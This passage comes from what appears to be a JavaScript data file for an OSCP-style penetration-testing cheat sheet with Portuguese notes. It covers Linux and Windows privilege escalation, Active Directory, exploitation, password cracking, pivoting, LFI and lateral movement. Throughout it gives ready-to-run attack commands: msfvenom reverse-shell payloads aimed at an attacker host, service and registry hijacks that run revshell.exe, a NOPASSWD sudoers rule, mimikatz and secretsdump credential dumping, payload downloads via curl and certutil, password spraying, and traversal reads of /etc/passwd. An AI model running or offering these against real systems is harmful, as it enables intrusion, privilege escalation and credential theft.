          { title: "Enumerate capabilities", cmd: "getcap -r / 2>/dev/null" },
          { title: "Abuse candidates", cmd: "# Veja no GTFOBins as t√©cnicas por capabilities\n# https://gtfobins.github.io/#+capabilities\n# Exemplos fortes: cap_setuid+ep em python/perl/php, cap_dac_read_search+ep etc" }
        ]
      },
  
      {
        name: "sudoers writable?",
        tag: ["linux", "sudoers", "permissions", "privesc"],
        steps: [
          { title: "Check sudoers perms", cmd: "ls -l /etc/sudoers\nls -ld /etc/sudoers.d 2>/dev/null\nls -l /etc/sudoers.d 2>/dev/null" },
          { title: "If writable: add rule (careful)", cmd: "# Se for grav√°vel, voc√™ pode adicionar regra para seu usu√°rio\n# Ex: samuel ALL=(ALL) NOPASSWD:ALL\n# Depois: sudo -s" }
        ]
      },
  
      {
        name: "Config files and secrets",
        tag: ["linux", "config", "credentials", "privesc"],
        steps: [
          { title: "Find juicy configs quickly", cmd: "find / -maxdepth 4 -type f \\( -name \"*.conf\" -o -name \"*.cnf\" -o -name \"*.ini\" -o -name \"*.yml\" -o -name \"*.yaml\" -o -name \".env\" -o -name \"*.properties\" \\) 2>/dev/null | head -n 300" },
          { title: "Greps for secrets", cmd: "grep -RIn --binary-files=without-match \"pass\\|password\\|token\\|secret\\|apikey\\|key=\" /etc /opt /var/www /home 2>/dev/null | head -n 200" },
          { title: "If you get creds", cmd: "# Tente pivot: su, ssh, sudo, DB local, painel interno, servi√ßos escutando s√≥ em localhost" }
        ]
      },
  
      {
        name: "Container check",
        tag: ["linux", "docker", "container", "privesc"],
        steps: [
          { title: "Quick container signals", cmd: "cat /proc/1/cgroup 2>/dev/null\ncat /proc/self/mountinfo 2>/dev/null | head\nls -la /.dockerenv 2>/dev/null" },
          { title: "Network hint (as in your flow)", cmd: "ip a 2>/dev/null || ifconfig 2>/dev/null" },
          { title: "If container: look for escape paths", cmd: "# HackTricks: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security\n# Procure: docker.sock montado, volumes sens√≠veis, privileged, CAP_SYS_ADMIN, host mounts (/var/run/docker.sock, /, /proc)" }
        ]
      },
  
      {
        name: "Processes running as root",
        tag: ["linux", "process", "services", "privesc"],
        steps: [
          { title: "Enumerate processes", cmd: "ps aux 2>/dev/null" },
          { title: "If something root is interesting", cmd: "# Tente hijack: config writable, script writable, path injection, LD_PRELOAD (se permitido), env abuse\n# Cheque tamb√©m unit files: systemctl cat <service>" }
        ]
      },
  
      {
        name: "Internal ports and local-only services",
        tag: ["linux", "ports", "tunnel", "privesc"],
        steps: [
          { title: "Check listeners", cmd: "ss -anp 2>/dev/null || netstat -ant 2>/dev/null" },
          { title: "Local port scan option", cmd: "# Se precisar, suba um bin√°rio de nmap (ou use bash tcp)\n# Ex bash: for p in {1..65535}; do (echo >/dev/tcp/127.0.0.1/$p) >/dev/null 2>&1 && echo OPEN $p; done" },
          { title: "If service is only on localhost", cmd: "# Avalie se precisa de tunnel (ssh -L, chisel, socat) para explorar a partir da sua m√°quina\n# Se n√£o precisar, enumere o que √© e ataque direto localmente" }
        ]
      }
    ]
  },
  {
    category: "Windows PrivEsc",
    icon: "ü™ü",
    profile: ["oscp", "ad"],
    note: "Fluxo WPE: enum de privil√©gios e grupos, servi√ßos e permiss√µes (incl. unquoted/weak perms/registry), tasks, autoruns, AlwaysInstallElevated, cred hunting (IIS/PS history/unattend/cmdkey), hash dumping (mimikatz/SeBackupPrivilege), portas locais + tunneling, DLL hijack/GUI abuse, software vuln + kernel exploit (WES-NG), winPEAS.",
    items: [
      {
        name: "Host baseline + identity",
        tag: ["windows", "enum"],
        steps: [
          { title: "Systeminfo", cmd: "systeminfo" },
          { title: "Whoami + privs + groups", cmd: "whoami\nwhoami /priv\nwhoami /groups" },
          { title: "Local users + admins", cmd: "net user\nnet localgroup administrators" },
          { title: "Network baseline", cmd: "ipconfig /all\nroute print\nnetstat -ano" }
        ]
      },
  
      {
        name: "Privileges mapping (Priv2Admin)",
        tag: ["windows", "privesc", "privileges"],
        steps: [
          { title: "List token privileges", cmd: "whoami /priv" },
          { title: "Map privileges to escalation paths", cmd: "# Compare com Priv2Admin e tente a trilha do privil√©gio que voc√™ tem\n# https://github.com/gtworek/Priv2Admin" }
        ]
      },
  
      {
        name: "Services: weak permissions (AccessChk)",
        tag: ["windows", "privesc", "services"],
        steps: [
          { title: "List services", cmd: "sc query type= service state= all" },
          {
            title: "Can change service config? (SERVICE_CHANGE_CONFIG)",
            cmd: "accesschk.exe -uwcqv \"{username}\" *"
          },
          {
            title: "Repoint service binary (if allowed)",
            cmd: "sc config {service_name} binPath= \"C:\\Path\\to\\revshell.exe\""
          },
          { title: "Start service", cmd: "net start {service_name}" },
          {
            title: "Service binary writable?",
            cmd: "accesschk.exe /accepteula -quvw \"C:\\Path\\to\\insecureservice.exe\""
          },
          {
            title: "Replace binary (if writable)",
            cmd: "copy C:\\Path\\to\\revshell.exe \"C:\\Path\\to\\vulnerable\\service\\directory\\{service_name}.exe\" /Y"
          }
        ]
      },
  
      {
        name: "Services: unquoted service paths",
        tag: ["windows", "privesc", "services"],
        steps: [
          {
            title: "Find unquoted paths (auto start, non-Windows)",
            cmd: "wmic service get name,displayname,pathname,startmode | findstr /i \"Auto\" | findstr /i /v \"C:\\\\Windows\\\\\" | findstr /i /v \"\\\"\""
          },
          {
            title: "Plant executable in a writable segment (example)",
            cmd: "# Ex: se path for C:\\Program Files\\Vuln App\\app.exe\n# tente escrever C:\\Program.exe ou C:\\Program Files\\Vuln.exe dependendo do caso\n# Use accesschk/icacls para descobrir onde voc√™ consegue escrever"
          },
          { title: "Start service", cmd: "net start {service_name}" }
        ]
      },
  
      {
        name: "Services via Registry (ImagePath hijack)",
        tag: ["windows", "privesc", "registry", "services"],
        steps: [
          {
            title: "Overwrite ImagePath (example from flow)",
            cmd: "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc\" /v ImagePath /t REG_EXPAND_SZ /d C:\\Path\\to\\revshell.exe /f"
          },
          { title: "Start service", cmd: "net start {service_name}" }
        ]
      },
  
      {
        name: "Autoruns (Run keys)",
        tag: ["windows", "privesc", "persistence", "autorun"],
        steps: [
          {
            title: "Check non-default autorun entries",
            cmd: "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
          },
          {
            title: "If target EXE is writable/replaceable",
            cmd: "copy C:\\Path\\to\\revshell.exe \"C:\\Program Files\\Autorun\\Program\\program.exe\" /Y"
          }
        ]
      },
  
      {
        name: "AlwaysInstallElevated",
        tag: ["windows", "privesc", "msi"],
        steps: [
          {
            title: "Check HKCU",
            cmd: "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
          },
          {
            title: "Check HKLM",
            cmd: "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
          },
          { title: "If both are 0x1: generate MSI (attacker)", cmd: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f msi -o reverse.msi" },
          { title: "Execute MSI (target)", cmd: "msiexec /quiet /qn /i C:\\Path\\to\\reverse.msi" }
        ]
      },
  
      {
        name: "Scheduled tasks (non-default) + writable scripts",
        tag: ["windows", "privesc", "schtasks"],
        steps: [
          {
            title: "List non-Microsoft tasks (PowerShell)",
            cmd: "powershell -c \"Get-ScheduledTask | where {$_.TaskPath -notlike '\\\\Microsoft*'} | ft TaskName,TaskPath,State\""
          },
          { title: "Verbose scheduled tasks listing", cmd: "schtasks /query /fo LIST /v" },
          {
            title: "Is task script writable?",
            cmd: "accesschk.exe /accepteula -quvw {user} C:\\Path\\To\\Scheduled\\task.ps1"
          },
          {
            title: "Append payload call (example from flow)",
            cmd: "powershell -c \"echo C:\\Path\\To\\revshell.exe >> C:\\Path\\To\\Scheduled\\task.ps1\""
          }
        ]
      },
  
      {
        name: "Credential hunting",
        tag: ["windows", "creds", "enum"],
        steps: [
          {
            title: "Unattend locations",
            cmd: "dir /s /b C:\\Unattend.xml C:\\Windows\\Panther\\Unattend.xml C:\\Windows\\Panther\\Unattend\\Unattend.xml 2>nul"
          },
          {
            title: "PowerShell history",
            cmd: "powershell -c \"type C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt\""
          },
          {
            title: "IIS web.config (common locations)",
            cmd: "type C:\\inetpub\\wwwroot\\web.config 2>nul\ntype C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config 2>nul"
          },
          { title: "Saved credentials", cmd: "cmdkey /list" },
          { title: "Search for passwords (broad)", cmd: "findstr /si password *.txt *.ini *.config *.xml *.yml 2>nul" }
        ]
      },
  
      {
        name: "Hash dumping (paths)",
        tag: ["windows", "hashes", "privesc"],
        steps: [
          {
            title: "Mimikatz (needs privileges)",
            cmd: "mimikatz.exe \"privilege::debug\" \"lsadump::lsa /patch\" \"exit\""
          },
          {
            title: "If SeBackupPrivilege or readable SAM/SYSTEM",
            cmd: "# Verifique se voc√™ tem SeBackupPrivilege em whoami /priv\n# Procure por:\n# C:\\Windows\\repair\\SAM\n# C:\\Windows\\repair\\SYSTEM\n# ou C:\\windows.old"
          },
          {
            title: "Offline dump (attacker) - creddump7",
            cmd: "python3 creddump7/pwdump.py SYSTEM SAM"
          },
          {
            title: "Offline dump (attacker) - impacket",
            cmd: "secretsdump.py -sam SAM -system SYSTEM LOCAL"
          },
          {
            title: "Mimikatz SAM offline (no target, if you have files)",
            cmd: "mimikatz.exe \"lsadump::sam /system:SYSTEM /sam:SAM\" \"exit\""
          }
        ]
      },
  
      {
        name: "Local ports + port-forwarding",
        tag: ["windows", "pivot", "ports"],
        steps: [
          { title: "List local listeners", cmd: "netstat -ano" },
          { title: "If something only binds localhost: investigate via tunneling", cmd: "# Use chisel para expor a porta local remotamente e enumerar o servi√ßo\n# Refer√™ncia: https://juggernaut-sec.com/port-forwarding/" },
          { title: "Chisel hint", cmd: "# Ideia: chisel server no atacante e client no target, com R:socks ou R:port\n# Ajuste conforme seu cen√°rio" }
        ]
      },
  
      {
        name: "Interesting groups (AD context)",
        tag: ["windows", "ad", "groups", "privesc"],
        steps: [
          { title: "Check membership", cmd: "whoami /groups" },
          { title: "Look for privileged groups (example: DnsAdmins)", cmd: "# Consulte a lista e explore o vetor espec√≠fico do grupo\n# https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges" }
        ]
      },
  
      {
        name: "DLL hijacking (Procmon)",
        tag: ["windows", "privesc", "dll"],
        steps: [
          { title: "Use Procmon to find NAME NOT FOUND DLL loads", cmd: "# Rode Procmon, filtre por 'NAME NOT FOUND' e processos privilegiados\n# Se achar DLL procurada em path grav√°vel, gere DLL e plante no local correto" },
          { title: "Reference", cmd: "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking" }
        ]
      },
  
      {
        name: "GUI apps misconfig (admin-launched apps)",
        tag: ["windows", "privesc", "gui"],
        steps: [
          { title: "Look for admin-run GUI apps", cmd: "# Exemplo: paint, apps internas, viewers. Procure por 'Open File' e tente chamar cmd.exe via caminho absoluto." },
          { title: "Reference", cmd: "https://juggernaut-sec.com/insecure-gui-applications/" }
        ]
      },
  
      {
        name: "Installed software + kernel exploit check (WES-NG)",
        tag: ["windows", "privesc", "kernel", "software"],
        steps: [
          { title: "Installed software quick", cmd: "wmic product get name,version,vendor" },
          { title: "Export systeminfo for WES", cmd: "systeminfo > systeminfo.txt" },
          { title: "Run WES-NG (attacker)", cmd: "# https://github.com/bitsadmin/wesng\n# python wes.py systeminfo.txt" }
        ]
      },
  
      {
        name: "Automated triage",
        tag: ["windows", "privesc", "automation"],
        steps: [
          { title: "winPEAS", cmd: "# Rode winPEAS e correlacione achados com as trilhas acima\n# (servi√ßos, tasks, creds, permiss√µes, kernel)" }
        ]
      }
    ]
  },


  {
    category: "AD Toolkit",
    icon: "üß©",
    profile: ["ad"],
    note: "Colete, valide acessos e iterar r√°pido. Ajuste conforme o dom√≠nio.",
    items: [
      {
        name: "BloodHound collection",
        tag: ["ad", "bloodhound"],
        steps: [
          { title: "bloodhound-python All", cmd: "bloodhound-python -d {domain} -u {user} -p \"{pass}\" -ns {ip} -c All" },
          { title: "SharpHound (se tiver exec)", cmd: "SharpHound.exe -c All" }
        ]
      },
      {
        name: "AD quick checks",
        tag: ["ad", "enum"],
        steps: [
          { title: "CME auth check", cmd: "crackmapexec smb {ip} -u {user} -p \"{pass}\"" },
          { title: "LDAP naming contexts", cmd: "ldapsearch -x -H ldap://{ip} -s base namingcontexts" }
        ]
      }
    ]
  },
  {
  category: "Exploitation",
    icon: "üß®",
    profile: ["oscp", "web", "ad"],
    note: "Fluxo: identificar vers√£o, buscar exploit, validar, adaptar, executar com evid√™ncia.",
    items: [
      {
        name: "Searchsploit basics",
        tag: ["exploit", "searchsploit"],
        steps: [
          { title: "Buscar por servi√ßo e vers√£o", cmd: "searchsploit \"SERVICE\" \"VERSION\"" },
          { title: "Copiar exploit local", cmd: "searchsploit -m EXPLOIT_ID" },
          { title: "Inspecionar paths", cmd: "searchsploit -x EXPLOIT_ID" },
          { title: "Checar notas", cmd: "searchsploit -w EXPLOIT_ID" }
        ]
      },
      {
        name: "Common staging",
        tag: ["exploit", "staging"],
        note: "Quando voc√™ precisa subir bin√°rio ou script rapidamente.",
        steps: [
          { title: "Attacker HTTP server", cmd: "python3 -m http.server {lport} --bind 0.0.0.0" },
          { title: "Linux download curl", cmd: "curl -L http://{lhost}:{lport}/FILE -o /tmp/FILE" },
          { title: "Linux download wget", cmd: "wget http://{lhost}:{lport}/FILE -O /tmp/FILE" },
          { title: "Windows download iwr", cmd: "powershell -c \"iwr http://{lhost}:{lport}/FILE -OutFile C:\\\\Windows\\\\Temp\\\\FILE\"" },
          { title: "Windows download certutil", cmd: "certutil -urlcache -split -f http://{lhost}:{lport}/FILE C:\\\\Windows\\\\Temp\\\\FILE" }
        ]
      },
      {
        name: "MSFVenom quick payloads",
        tag: ["exploit", "msfvenom", "payload"],
        note: "Gere payloads de laborat√≥rio. Ajuste conforme o cen√°rio e egress.",
        steps: [
          { title: "Linux ELF reverse TCP", cmd: "msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o rev.elf" },
          { title: "Windows EXE reverse TCP", cmd: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o rev.exe" },
          { title: "ASP.NET reverse TCP", cmd: "msfvenom -p windows/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f aspx -o rev.aspx" },
          { title: "PHP reverse TCP", cmd: "msfvenom -p php/reverse_php LHOST={lhost} LPORT={lport} -f raw -o rev.php" }
        ]
      },
      {
        name: "Listeners",
        tag: ["exploit", "shell", "listener"],
        steps: [
          { title: "Netcat", cmd: "nc -lvnp {lport}" },
          { title: "rlwrap nc", cmd: "rlwrap nc -lvnp {lport}" },
          { title: "Multi handler (metasploit)", cmd: "msfconsole -q\nuse exploit/multi/handler\nset payload windows/x64/shell_reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nrun -j" }
        ]
      }
    ]
  },

  {
    category: "Passwords & Cracking",
    icon: "üîë",
    profile: ["oscp", "web", "ad"],
    note: "Ataques comuns: brute controlado, spray e cracking offline. Registre o que funcionou.",
    items: [
      {
        name: "Hydra basics",
        tag: ["crack", "hydra", "bruteforce"],
        note: "Brute com cuidado. Prefira listas curtas e resultados r√°pidos.",
        steps: [
          { title: "SSH single user + wordlist", cmd: "hydra -l {user} -P {wordlist} ssh://{ip} -t 4 -V" },
          { title: "RDP single user + wordlist", cmd: "hydra -l {user} -P {wordlist} rdp://{ip} -t 4 -V" },
          { title: "HTTP basic auth", cmd: "hydra -l {user} -P {wordlist} {ip} http-get / -t 4 -V" }
        ]
      },
      {
        name: "John the Ripper",
        tag: ["crack", "john"],
        steps: [
          { title: "Crack b√°sico", cmd: "john --wordlist={wordlist} {hashfile}" },
          { title: "Mostrar cracks", cmd: "john --show {hashfile}" },
          { title: "Format manual", cmd: "john --format=FORMAT --wordlist={wordlist} {hashfile}" }
        ]
      },
      {
        name: "Hashcat",
        tag: ["crack", "hashcat"],
        note: "Ajuste o modo -m conforme o tipo de hash.",
        steps: [
          { title: "Crack wordlist", cmd: "hashcat -m 0 -a 0 {hashfile} {wordlist} --force" },
          { title: "Mostrar cracks", cmd: "hashcat -m 0 --show {hashfile}" },
          { title: "Rule b√°sica", cmd: "hashcat -m 0 -a 0 {hashfile} {wordlist} -r /usr/share/hashcat/rules/best64.rule --force" }
        ]
      },
      {
        name: "AD password spraying",
        tag: ["ad", "spray", "cme", "kerberos"],
        note: "Spray controlado. Teste uma senha em v√°rios usu√°rios, n√£o o contr√°rio.",
        steps: [
          { title: "kerbrute passwordspray", cmd: "kerbrute passwordspray --dc {ip} -d {domain} users.txt \"{pass}\"" },
          { title: "CME spray SMB", cmd: "crackmapexec smb {ip} -u users.txt -p \"{pass}\" --continue-on-success" },
          { title: "CME validate single", cmd: "crackmapexec smb {ip} -u {user} -p \"{pass}\"" }
        ]
      }
    ]
  },

  {
    category: "FTP",
    icon: "üìÅ",
    profile: ["oscp", "web"],
    note: "Checar anon, listar, upload e arquivos interessantes.",
    items: [
      {
        name: "FTP enum",
        tag: ["ftp", "enum"],
        steps: [
          { title: "Nmap scripts", cmd: "nmap -p 21 -sV --script \"ftp*\" {ip}" },
          { title: "ftp client", cmd: "ftp {ip}" },
          { title: "Anon login", cmd: "ftp {ip}\nName: anonymous\nPassword: anonymous" }
        ]
      }
    ]
  },

  {
    category: "SMTP",
    icon: "‚úâÔ∏è",
    profile: ["oscp"],
    note: "Enum de users e banners. √ötil para descobrir contas e fluxos.",
    items: [
      {
        name: "SMTP enum",
        tag: ["smtp", "enum"],
        steps: [
          { title: "Nmap scripts", cmd: "nmap -p 25,465,587 -sV --script \"smtp*\" {ip}" },
          { title: "Banner", cmd: "nc -nv {ip} 25" },
          { title: "VRFY manual", cmd: "nc -nv {ip} 25\nVRFY {user}\nEXPN {user}" }
        ]
      }
    ]
  },

  {
    category: "SNMP",
    icon: "üì°",
    profile: ["oscp"],
    note: "Comunidades comuns: public, private. Se abrir, pode vazar muita info.",
    items: [
      {
        name: "SNMP walk",
        tag: ["snmp", "enum"],
        steps: [
          { title: "snmpwalk v2 public", cmd: "snmpwalk -v2c -c public {ip} 1.3.6.1.2.1 | head -n 80" },
          { title: "snmp-check", cmd: "snmp-check {ip} -c public" },
          { title: "Nmap scripts", cmd: "nmap -p 161 -sU --script \"snmp*\" {ip}" }
        ]
      }
    ]
  },

  {
    category: "DNS",
    icon: "üß†",
    profile: ["oscp", "ad"],
    note: "Zone transfer e enum de nomes. Em AD, DNS √© pista grande.",
    items: [
      {
        name: "DNS enum",
        tag: ["dns", "enum"],
        steps: [
          { title: "Dig ANY", cmd: "dig @{ip} {domain} ANY" },
          { title: "Zone transfer", cmd: "dig @{ip} {domain} AXFR" },
          { title: "Subdomain brute (dnsrecon)", cmd: "dnsrecon -d {domain} -D {wordlist} -t brt -n {ip}" }
        ]
      }
    ]
  },

  {
    category: "NFS",
    icon: "üß∑",
    profile: ["oscp"],
    note: "Shares NFS mal configurados s√£o caminho r√°pido para foothold ou privesc.",
    items: [
      {
        name: "NFS enum and mount",
        tag: ["nfs", "enum"],
        steps: [
          { title: "Showmount", cmd: "showmount -e {ip}" },
          { title: "Mount share", cmd: "sudo mount -t nfs {ip}:/SHARE /mnt/nfs -o nolock" },
          { title: "List interesting perms", cmd: "ls -la /mnt/nfs" }
        ]
      }
    ]
  },

  {
    category: "RPC",
    icon: "üß∞",
    profile: ["oscp", "ad"],
    note: "RPC pode ajudar em enum de AD e services Windows.",
    items: [
      {
        name: "RPC enum",
        tag: ["rpc", "enum"],
        steps: [
          { title: "Nmap RPC", cmd: "nmap -p 135,139,445 -sV {ip}" },
          { title: "rpcclient connect", cmd: "rpcclient -U \"{user}%{pass}\" {ip}" },
          { title: "Enum users", cmd: "rpcclient -U \"{user}%{pass}\" {ip} -c \"enumdomusers\"" }
        ]
      }
    ]
  },

  {
    category: "Redis",
    icon: "üß±",
    profile: ["oscp"],
    note: "Se Redis estiver exposto sem auth, d√° para enumerar dados e configs.",
    items: [
      {
        name: "Redis quick",
        tag: ["redis", "enum"],
        steps: [
          { title: "Ping", cmd: "redis-cli -h {ip} -p {port} ping" },
          { title: "Info", cmd: "redis-cli -h {ip} -p {port} info | head -n 80" },
          { title: "Keys sample", cmd: "redis-cli -h {ip} -p {port} --scan | head -n 50" }
        ]
      }
    ]
  },

  {
    category: "Pivoting Advanced",
    icon: "üï≥Ô∏è",
    profile: ["oscp", "ad"],
    note: "Quando SSH n√£o resolve, use tunelamento dedicado. Mantenha o fluxo simples.",
    items: [
      {
        name: "Ligolo-ng",
        tag: ["pivot", "ligolo"],
        note: "Excelente para tunelamento com interface TUN e roteamento limpo.",
        steps: [
          { title: "Proxy (attacker)", cmd: "sudo ./proxy -selfcert -laddr 0.0.0.0:{lport}" },
          { title: "Agent (victim)", cmd: "./agent -connect {lhost}:{lport} -ignore-cert" },
          { title: "Create TUN (attacker)", cmd: "sudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up" },
          { title: "Route to internal net (example)", cmd: "sudo ip route add 10.10.0.0/16 dev ligolo" }
        ]
      },
      {
        name: "sshuttle",
        tag: ["pivot", "sshuttle", "proxy"],
        steps: [
          { title: "Route subnet via SSH", cmd: "sudo sshuttle -r {user}@{ip} 10.10.0.0/16" }
        ]
      },
      {
        name: "socat forward",
        tag: ["pivot", "socat"],
        steps: [
          { title: "TCP local forward", cmd: "socat TCP-LISTEN:{lport},fork,reuseaddr TCP:{ip}:{port}" }
        ]
      }
    ]
  },
  {
    category: "Web Uploads & RCE Helpers",
    icon: "üß™",
    profile: ["oscp", "web"],
    note: "Checklist para upload + execu√ß√£o: entender valida√ß√µes, paths, extens√£o, e onde o arquivo cai.",
    items: [
      {
        name: "Upload validation checks",
        tag: ["web", "upload", "enum"],
        note: "Antes de tentar execu√ß√£o: descubra onde salva, como renomeia, se tem scan e quais extens√µes aceita.",
        steps: [
          { title: "Headers √∫teis", cmd: "curl -i -s {url} | head -n 30" },
          { title: "Upload endpoint (descoberta)", cmd: "ffuf -u {url}/FUZZ -w {wordlist} -t 60 -fc 404 -e .php,.asp,.aspx,.txt,.html" },
          { title: "Verificar respostas e redirects", cmd: "curl -i -s {url}/upload | sed -n '1,60p'" }
        ]
      },
      {
        name: "Multipart upload templates",
        tag: ["web", "upload"],
        note: "Templates de request. Ajuste o par√¢metro e o endpoint.",
        steps: [
          { title: "curl multipart (arquivo)", cmd: "curl -i -s -X POST -F \"file=@FILE\" {url}/upload" },
          { title: "curl multipart (nome custom)", cmd: "curl -i -s -X POST -F \"file=@FILE;filename=test.txt\" {url}/upload" },
          { title: "curl multipart (campo alternativo)", cmd: "curl -i -s -X POST -F \"upload=@FILE\" {url}/upload" }
        ]
      },
      {
        name: "Post-upload discovery",
        tag: ["web", "upload", "recon"],
        note: "Depois de subir um arquivo, encontre o path final no app.",
        steps: [
          { title: "Buscar refer√™ncia do filename", cmd: "curl -s {url} | grep -i \"test\" -n | head" },
          { title: "Paths comuns", cmd: "for p in uploads upload files static assets images img media; do echo \"$p\"; curl -s -o /dev/null -w \"%{http_code} {url}/$p/FILE\\n\" {url}/$p/FILE; done" }
        ]
      }
    ]
  },

  {
    category: "LFI & Path Traversal Checklist",
    icon: "üß∑",
    profile: ["oscp", "web"],
    note: "Fluxo: identificar par√¢metro, testar leitura, validar normaliza√ß√£o e encontrar arquivos alvo.",
    items: [
      {
        name: "Parameter hunting",
        tag: ["web", "lfi", "enum"],
        steps: [
          { title: "Buscar par√¢metros comuns", cmd: "ffuf -u \"{url}/?FUZZ=test\" -w params.txt -fs 0" },
          { title: "Grep em HTML/JS (manual)", cmd: "curl -s {url} | grep -Eo \"(file|path|page|template|include|doc|download)=\" | head" }
        ]
      },
      {
        name: "LFI target files (Linux)",
        tag: ["web", "lfi", "linux"],
        note: "√ötil para valida√ß√£o de leitura. Ajuste o par√¢metro conforme o app.",
        steps: [
          { title: "/etc/passwd", cmd: "curl -s \"{url}/?file=/etc/passwd\" | head" },
          { title: "/proc/self/environ", cmd: "curl -s \"{url}/?file=/proc/self/environ\" | head" },
          { title: "Apache logs (paths comuns)", cmd: "curl -s \"{url}/?file=/var/log/apache2/access.log\" | head\ncurl -s \"{url}/?file=/var/log/httpd/access_log\" | head" }
        ]
      },
      {
        name: "LFI target files (Windows)",
        tag: ["web", "lfi", "windows"],
        steps: [
          { title: "win.ini", cmd: "curl -s \"{url}/?file=C:/Windows/win.ini\" | head" },
          { title: "hosts", cmd: "curl -s \"{url}/?file=C:/Windows/System32/drivers/etc/hosts\" | head" }
        ]
      },
      {
        name: "Traversal patterns (manual)",
        tag: ["web", "lfi", "traversal"],
        note: "Padr√µes para testar normaliza√ß√£o. Use com parcim√¥nia.",
        steps: [
          { title: "Basic traversal", cmd: "curl -s \"{url}/?file=../../../../etc/passwd\" | head" },
          { title: "URL-encoded dots/slashes", cmd: "curl -s \"{url}/?file=..%2f..%2f..%2f..%2fetc%2fpasswd\" | head" },
          { title: "Double encoding (se aplic√°vel)", cmd: "curl -s \"{url}/?file=..%252f..%252f..%252f..%252fetc%252fpasswd\" | head" }
        ]
      }
    ]
  },

  {
    category: "Windows Lateral Movement (Basics)",
    icon: "üß≠",
    profile: ["oscp", "ad"],
    note: "Valida√ß√£o de credenciais e execu√ß√£o remota em ambiente controlado. Use s√≥ quando autorizado.",
    items: [
      {
        name: "Impacket exec (overview)",
        tag: ["windows", "lateral", "impacket"],
        note: "Ferramentas t√≠picas para execu√ß√£o remota. Escolha conforme permiss√µes e servi√ßo.",
        steps: [
          { title: "psexec (SMB)", cmd: "psexec.py {domain}/{user}:\"{pass}\"@{ip}" },
          { title: "wmiexec", cmd: "wmiexec.py {domain}/{user}:\"{pass}\"@{ip}" },
          { title: "smbexec", cmd: "smbexec.py {domain}/{user}:\"{pass}\"@{ip}" }
        ]
      },
      {
        name: "WinRM & RDP validate",
        tag: ["windows", "lateral", "access"],
        steps: [
          { title: "evil-winrm", cmd: "evil-winrm -i {ip} -u {user} -p \"{pass}\"" },
          { title: "xfreerdp", cmd: "xfreerdp /v:{ip} /u:{user} /p:\"{pass}\" /dynamic-resolution /cert:ignore" }
        ]
      },
      {
        name: "SMB copy + remote execution helpers",
        tag: ["windows", "lateral", "transfer"],
        steps: [
          { title: "SMB server (attacker)", cmd: "impacket-smbserver share . -smb2support -username {user} -password \"{pass}\"" },
          { title: "Copy from share (Windows)", cmd: "copy \\\\{lhost}\\\\share\\\\FILE C:\\\\Windows\\\\Temp\\\\FILE" }
        ]
      }
    ]
  },

  {
    category: "Service-Specific Enum",
    icon: "üß∞",
    profile: ["oscp", "web", "ad"],
    note: "Servi√ßos que aparecem muito: Tomcat, Jenkins, WordPress, Git, Docker, Java apps.",
    items: [
      {
        name: "Tomcat",
        tag: ["web", "tomcat", "enum"],
        steps: [
          { title: "Manager endpoints", cmd: "curl -s -o /dev/null -w \"%{http_code} {url}/manager/html\\n\" {url}/manager/html\ncurl -s -o /dev/null -w \"%{http_code} {url}/host-manager/html\\n\" {url}/host-manager/html" },
          { title: "Version hints", cmd: "curl -s {url} | grep -i \"tomcat\" -n | head" }
        ]
      },
      {
        name: "Jenkins",
        tag: ["web", "jenkins", "enum"],
        steps: [
          { title: "Common paths", cmd: "curl -s -o /dev/null -w \"%{http_code} {url}/login\\n\" {url}/login\ncurl -s -o /dev/null -w \"%{http_code} {url}/script\\n\" {url}/script\ncurl -s -o /dev/null -w \"%{http_code} {url}/manage\\n\" {url}/manage" },
          { title: "Headers", cmd: "curl -i -s {url} | grep -i \"jenkins\\|x-jenkins\" -n | head" }
        ]
      },
      {
        name: "WordPress",
        tag: ["web", "wp", "enum"],
        steps: [
          { title: "wp-login/wp-admin", cmd: "curl -s -o /dev/null -w \"%{http_code} {url}/wp-login.php\\n\" {url}/wp-login.php\ncurl -s -o /dev/null -w \"%{http_code} {url}/wp-admin/\\n\" {url}/wp-admin/" },
          { title: "wpscan (se instalado)", cmd: "wpscan --url {url} --enumerate p,t,u --api-token TOKEN_IF_ANY" }
        ]
      },
      {
        name: "Git exposure",
        tag: ["web", "git", "enum"],
        steps: [
          { title: ".git/HEAD", cmd: "curl -s -o /dev/null -w \"%{http_code}\\n\" {url}/.git/HEAD" },
          { title: ".git/config", cmd: "curl -s {url}/.git/config | head -n 40" }
        ]
      },
      {
        name: "Docker hints",
        tag: ["linux", "docker", "enum"],
        steps: [
          { title: "In group docker?", cmd: "id\ngetent group docker 2>/dev/null" },
          { title: "Docker socket exists", cmd: "ls -la /var/run/docker.sock 2>/dev/null" }
        ]
      }
    ]
  },
  {
    category: "Pivoting / Tunneling",
    icon: "üï≥Ô∏è",
    profile: ["oscp", "ad"],
    note: "Proxy SOCKS e port forwards para enxergar rede interna.",
    items: [
      {
        name: "SSH tunnels",
        tag: ["pivot", "ssh"],
        steps: [
          { title: "SOCKS proxy", cmd: "ssh -D 127.0.0.1:1080 {user}@{ip}" },
          { title: "Local forward", cmd: "ssh -L 127.0.0.1:8888:{ip}:{port} {user}@{ip}" },
          { title: "Remote forward", cmd: "ssh -R 0.0.0.0:{lport}:127.0.0.1:{port} {user}@{ip}" }
        ]
      },
      {
        name: "Proxychains",
        tag: ["pivot", "proxy"],
        steps: [
          { title: "Example (nmap -sT)", cmd: "proxychains -q nmap -sT -Pn -p {port} {ip}" },
          { title: "Example (curl)", cmd: "proxychains -q curl -i {url}" }
        ]
      },
      {
        name: "Chisel",
